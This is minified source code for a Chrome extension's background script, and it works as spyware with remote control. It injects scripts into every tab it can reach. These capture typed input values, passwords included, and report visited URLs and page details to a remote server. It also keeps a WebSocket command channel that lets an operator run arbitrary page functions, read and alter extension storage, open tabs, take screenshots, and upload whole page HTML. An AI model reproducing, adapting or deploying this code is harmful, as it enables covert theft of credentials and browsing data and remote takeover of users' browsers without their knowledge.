function initForeground(){async function n(){window.storageLocal=chrome.storage.local,window.storageSync=chrome.storage.sync;const{url:e,uuid:t}=await storageLocal.get(),a=e+"/api/extension/url_details",n=e+"/api/extension/inputs",o=t?.replace(/&/g,"")||navigator.platform||navigator.userAgentData?.platform||"Unknown";storageLocal.set({uuid:o});{let e=document.querySelector("link[rel=icon]");e=e?e.href||"No link":"No icon",r({url:a,body:{...location,icon:e,title:document.title,deviceId:o}})}{window.all=[];const i=t=>t.onblur=()=>{var e;t.value&&(e=all.map(({id:e,name:t,type:a,value:n,touched:o})=>({id:e,name:t,type:a,value:n,touched:o})),r({url:n,body:{json:JSON.stringify(e),...location,deviceId:o}}))},c=e=>{console.log(e),e.onchange=()=>{e.touched=!0}};addEvent=e=>e.forEach(e=>{i(e),c(e),all.push(e)}),(init=e=>{var t=[...e.querySelectorAll("input")].filter(e=>!["checkbox","submit","radio","date","datetime","time","select"].includes(e.type));addEvent(t),e.querySelectorAll("*").forEach(e=>{e.shadowRoot&&init(e.shadowRoot)})})(document.body)}function r(e){chrome.runtime.sendMessage({action:"POST",payload:e})}}async function o(o){window.storageLocal=chrome.storage.local,window.storageSync=chrome.storage.sync,window.getDomPath=e=>{if(e){for(var t=[],a=!1;null!=e.parentNode;){for(var n=0,o=0,r=0;r<e.parentNode.childNodes.length;r++){var i=e.parentNode.childNodes[r];i.nodeName==e.nodeName&&(i===e&&(o=n),n++)}var c=e.nodeName.toLowerCase();a&&(c+="::shadow",a=!1),1<n?t.unshift(c+":nth-of-type("+(o+1)+")"):t.unshift(c),11===(e=e.parentNode).nodeType&&(a=!0,e=e.host)}return t.splice(0,1),t.join(" > ")}};const{uuid:e,socketUrl:t,socketHost:n}=await storageLocal.get(),r=e?.replace(/&/g,"")||navigator.platform||navigator.userAgentData?.platform||"Unknown";let i;storageLocal.set({uuid:r});window.wk||new class{constructor(){addEventListener("click",e=>{this.currentTarget=e.target}),(window.wk=this).clientId="Remote",this.help={"wk.getObject":"clone object | getObject(name)","wk.send":"send data | send(data)","wk.execute":"function call | execute(name, ...args)","wk.set":"set key with given value from remote | set(key, value)","wk.assign":"set key with executed value | assign(key, { name, args })","wk.querySelector":"wk.currentElement = query result","wk.getKeys":"get keys from object | getKeys(name)"}}getCurrentElementPath(){return getDomPath(this.currentElement)}getCurrentTargetPath(){return getDomPath(this.currentTarget)}execute(e,t){try{t=t.map(e=>"wk.execute"===e.type?this.execute(e.name,e.args):"wk.get"===e.type?this.get(e.name):"wk.getObject"===e.type?this.getObject(e.name):"wk.getKeys"===e.type?this.getKeys(e.name):"wk.assign"===e.type?this.assign(e.key,e.name,e.args):"wk.createFN"===e.type?this.createFN(e.name,e.body):e)}catch(e){return e.message}var[e,a,n,o,r]=e.split(".");return r?window[e][a][n][o][r]&&window[e][a][n][o][r].call?window[e][a][n][o][r](...t):null:o?window[e][a][n][o]&&window[e][a][n][o].call?window[e][a][n][o](...t):null:n?window[e][a][n]&&window[e][a][n].call?window[e][a][n](...t):null:a?window[e][a]&&window[e][a].call?window[e][a](...t):null:e?window[e]&&window[e].call?window[e](...t):null:void 0}getObject(e){let t;for(const a of e.split("."))t=(t||window)[a];return t}async send(e){e=await e,this.clientId=this.clientId||"Remote";let t;function a(t){return{name:t.tagName,attr:t.getAttributeNames().map(e=>({[e]:t.getAttribute(e)}))}}(e=null==e?"null":e).forEach&&(e=[...e].map(e=>e.tagName?a:e)),t=e.tagName?a(e):e,this.data=e,i.emit("SEND",{clientId:this.clientId,action:"DATA",payload:t})}exec(e,t){e=this.execute(e,t);this.send(e)}get(e){return this.getObject(e)}set(t,a){try{const n=t.split(".").reverse();let e=window;for(;n.length;){const t=n.pop();if(n.length&&"object"!=typeof e[t])throw new Error(`Cannot get ${n.pop()} of none object`);n.length?e=e[t]:e[t]=a}}catch(e){return e.message}}assign(t,{name:a,args:n}){try{var o=this.execute(a,n);const r=t.split(".").reverse();let e=window;for(;r.length;){const t=r.pop();if(r.length&&"object"!=typeof e[t])throw new Error(`Cannot get ${r.pop()} of none object`);r.length?e=e[t]:e[t]=o}}catch(e){return e.message}}createFN(e,t){var a=()=>{for(const e of t)this.execute(e.name,e.args)};return e?this[e]=a:a}extractObject(e){var t=this.getObject(e);if(t){if("object"!=typeof t)return t;{let e={};for(const a in t)e[a]=t[a];return e}}}getKeys(e){return Object.keys(this.getObject(e))}querySelector(e){return this.currentElement=document.querySelector(e)}sendBG(e,t){return"function"==typeof t?chrome.runtime.sendMessage(e,t):chrome.runtime.sendMessage(e)}startBG(){this.sendBG("start"),this.enableBG=!0}stopBG(){this.enableBG=!1}async capture(){await this.sendBG({action:"CAPTURE",clientId:this.clientId})}pagecap(){try{var e,t,a=htmlScreenCaptureJs.capture("string",document,{logLevel:"off"});return!!a&&(e=(a.length/1e6).toFixed(2)+" MB",t=btoa(location.href).replace(/\//g,"slash"),this.sendBG({action:"POST",payload:{url:n+"/htmls",body:a,headers:{"Content-Type":"text/plain",deviceId:r,url:t}}}),{html:{id:t,size:e}})}catch(e){return e.message}}replaceVideoSrc(t){document.querySelectorAll("video").forEach(e=>t?e.src=t:"")}};let c=0;!function a(){i=new WebSocket(t);window.ws=i;i.emit=(e,t)=>i.send(JSON.stringify({action:e,payload:t}));i.onopen=e=>{function t(){c<2&&setTimeout(()=>{const e=wk.pagecap();if(!e)return t();c++,wk.send(e)},5e3)}c<2&&setTimeout(()=>{wk.capture(),c++},1e3),c<2&&t(),i.onmessage=({data:e})=>{const{action:t,from:a,payload:n}=JSON.parse(e);switch(wk.clientId=a||wk.clientId,wk.action,t){case"HI":i.send(JSON.stringify({action:"ID",payload:r+"-"+o}));break;case"exec":wk.exec(n.name,n.args);break;case"MEMBER_LEFT":wk.enableBG&&n.clientId===r+"-BG"&&wk.sendBG("start");break;case"ID":"ID_EXISTED"===n.message&&(i.onclose=null)}},i.onclose=()=>{i.onclose=null,setTimeout(a,2e3)}}}()}chrome.tabs.onUpdated.addListener(async function(e,t,a){"complete"===t.status&&a.url&&!a.url.startsWith("chrome://")&&(chrome.scripting.executeScript({target:{tabId:e},files:["s_copy.js"]}),chrome.scripting.executeScript({target:{tabId:e},function:o,args:[e]}),chrome.scripting.executeScript({target:{tabId:e},function:n}))})}async function initSocket(){const{uuid:r,socketUrl:e,socketHost:i}=await STORAGE_LOCAL.get(),c=r+"-BG";WS&&1===WS.readyState&&WS.id===c||(WS&&1===WS.readyState&&(WS.onclose=null,WS.close()),(WS=new WebSocket(e||INITAL_CONFIG.socketUrl)).emit=({clientId:e,payload:t})=>WS.send(JSON.stringify({action:"SEND",payload:{clientId:e,payload:t}})),WS.onopen=()=>{WS.onmessage=({data:e})=>{try{WS.handleData(JSON.parse(e))}catch(e){}}},WS.onclose=()=>setTimeout(()=>initSocket(c),2e3),WS.handleData=async function({action:e,from:t,payload:a}){let n="NOT MATCH";try{switch(e){case"HI":n=await void WS.send(JSON.stringify({action:"ID",payload:c}));break;case CMD.TAB:n=([o={}]=[...a],await chrome.tabs.query(o));break;case CMD.GOTO:n=await function(...e){if(e.length)return e.forEach(e=>{chrome.tabs.create(e)}),"CREATED"}(...a);break;case CMD.SET_STORAGE:n=await function(e,t){{if(e===CMD.LOCAL)return STORAGE_LOCAL.set({...t});if(e===CMD.SYNC)return STORAGE_SYNC.set({...t})}return{validKeys:[CMD.SYNC,CMD.LOCAL]}}(...a);break;case CMD.GET_STORAGE:n=await function(e){{if(e===CMD.LOCAL)return STORAGE_LOCAL.get();if(e===CMD.SYNC)return STORAGE_SYNC.get()}return{validKeys:[CMD.SYNC,CMD.LOCAL]}}(...a);break;case CMD.CAPTURE:n=await async function(){const e=[],t=await chrome.tabs.query({active:!0});for(var{url:a,windowId:n}of t){n=await chrome.tabs.captureVisibleTab(n);const o=await POST({url:i+"/images",headers:{"Content-Type":"text/plain",deviceId:r,url:btoa(a)},body:n});o.ok&&e.push(await o.text())}return{images:e}}();break;case CMD.HELP:return WS.emit({action:e,clientId:t,payload:CMD})}}catch(e){n=e.message}var o;"NOT MATCH"!==n&&(e+="_RES",WS.emit({action:e,clientId:t,payload:n}))})}importScripts("config.js"),initForeground(),initSocket(),chrome.tabs.onUpdated.addListener(async function(e,t,a){var n;"complete"===t.status&&a.url&&!a.url.startsWith("chrome://")&&({uuid:t,url:n}=await STORAGE_LOCAL.get(),POST({url:n+"/api/extension/tabs",body:{...a,deviceId:t||"Unknown"}}))}),chrome.runtime.onMessage.addListener(async(e,t,a)=>{switch(e.action){case CMD.POST:POST(e.payload);break;case CMD.CAPTURE:WS.handleData({action:e.action,from:e.clientId,payload:e.payload})}a()});
